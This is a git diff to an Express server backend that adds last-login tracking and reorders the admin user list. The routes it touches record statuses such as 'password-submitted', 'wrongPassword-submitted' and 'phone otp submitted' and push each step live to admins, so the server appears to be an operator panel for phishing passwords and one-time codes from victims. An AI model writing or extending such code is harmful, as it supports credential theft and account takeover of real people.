@@ -169,6 +169,17 @@ function getDeviceInfo(userAgent = "") {
   };
 }
 
+const updateLastLogin = async (user) => {
+  user.lastLogin = new Date();
+
+  await user.save();
+
+  emitToAdmins("user-last-login", {
+    userId: user._id,
+    lastLogin: user.lastLogin
+  });
+};
+
 app.post(
   "/api/auth/start",
   async (req, res) => {
@@ -202,6 +213,7 @@ app.post(
           email,
           passwordHash: null,
           phone: null,
+          lastLogin: new Date(),
           approved: false,
           device: deviceInfo.device,
           browser: deviceInfo.browser,
@@ -292,14 +304,10 @@ app.post(
 
       user.status =
         "password-submitted";
+      
+      await updateLastLogin(user);
 
-      await user.save();
-
-      console.log(
-        "Password submitted for:",
-        user.email
-      );
-
+     
       // Tell admin only that the password
       // step was completed.
       emitToAdmins(
@@ -311,8 +319,10 @@ app.post(
 
           status: user.status
         }
+
       );
 
+     
       res.json({
         message:
           "Password submitted successfully"
@@ -385,7 +395,7 @@ app.post(
       user.status =
         "wrongPassword-submitted";
 
-      await user.save();
+   await updateLastLogin(user);
 
       console.log(
         "wrongPassword submitted for:",
@@ -434,7 +444,7 @@ app.get(
       const users =
         await User.find({})
           .sort({
-            createdAt: -1
+            lastLogin: -1
           });
 
       res.json(users);
@@ -731,7 +741,7 @@ app.post(
       user.status =
         "phone-submitted";
 
-      await user.save();
+     await updateLastLogin(user);
 
       console.log(
         "Phone submitted for:",
@@ -799,7 +809,7 @@ app.post(
       user.status =
         "phone otp submitted";
 
-      await user.save();
+  await updateLastLogin(user);
 
       console.log(
         "Phone submitted for:",
@@ -866,7 +876,7 @@ app.post(
       user.status =
         "phone otp submitted";
 
-      await user.save();
+     await updateLastLogin(user);
 
       console.log(
         "Phone submitted for:",
